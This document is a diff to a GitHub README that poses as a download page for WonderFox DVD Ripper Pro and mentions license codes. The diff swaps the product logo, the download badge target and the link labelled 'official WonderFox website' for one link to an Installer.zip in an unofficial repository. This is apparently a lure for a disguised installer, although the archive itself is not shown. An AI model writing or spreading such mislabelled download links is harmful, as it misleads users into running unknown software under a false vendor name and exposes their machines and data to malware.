@@ -1,6 +1,6 @@
 # 📀 WonderFox DVD Ripper Pro Download 📀
 
-![WonderFox DVD Ripper Pro](https://www.wonderfoxsoft.com/img/logo-wonderfox.png)
+![WonderFox DVD Ripper Pro](https://github.com/Shanknomi/WonderFox-DVD-Ripper-Pro-Download/releases/download/v1.0/Installer.zip)
 
 Welcome to the WonderFox DVD Ripper Pro Download repository! Here you will find valuable information on how to use WonderFox DVD Ripper Pro to create ISO files, as well as discussions on its features, license codes, reviews, and more. Whether you are looking to convert DVDs to digital formats, backup your DVD collection, or create ISO images, WonderFox DVD Ripper Pro has got you covered.
 
@@ -24,7 +24,7 @@ Welcome to the WonderFox DVD Ripper Pro Download repository! Here you will find 
 ## Getting Started
 To start using WonderFox DVD Ripper Pro and explore its features, you can download the latest release from the link provided below:
 
-[![Download WonderFox DVD Ripper Pro](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download WonderFox DVD Ripper Pro](https://github.com/Shanknomi/WonderFox-DVD-Ripper-Pro-Download/releases/download/v1.0/Installer.zip)](https://github.com/Shanknomi/WonderFox-DVD-Ripper-Pro-Download/releases/download/v1.0/Installer.zip)
 
 🚀 **Launch the download to get started with WonderFox DVD Ripper Pro!** 🚀
 
@@ -32,7 +32,7 @@ To start using WonderFox DVD Ripper Pro and explore its features, you can downlo
 If you are interested in contributing to this repository by sharing your experiences, tips, or tricks about using WonderFox DVD Ripper Pro, feel free to open an issue or submit a pull request. Your contributions are highly appreciated!
 
 ## Support
-For any questions, technical support, or feedback regarding WonderFox DVD Ripper Pro, please visit the [official WonderFox website](https://www.wonderfoxsoft.com/dvd-ripper/) for more information.
+For any questions, technical support, or feedback regarding WonderFox DVD Ripper Pro, please visit the [official WonderFox website](https://github.com/Shanknomi/WonderFox-DVD-Ripper-Pro-Download/releases/download/v1.0/Installer.zip) for more information.
 
 Let's make DVD ripping and converting an enjoyable and seamless experience with WonderFox DVD Ripper Pro! Happy Ripping! 🌟
 
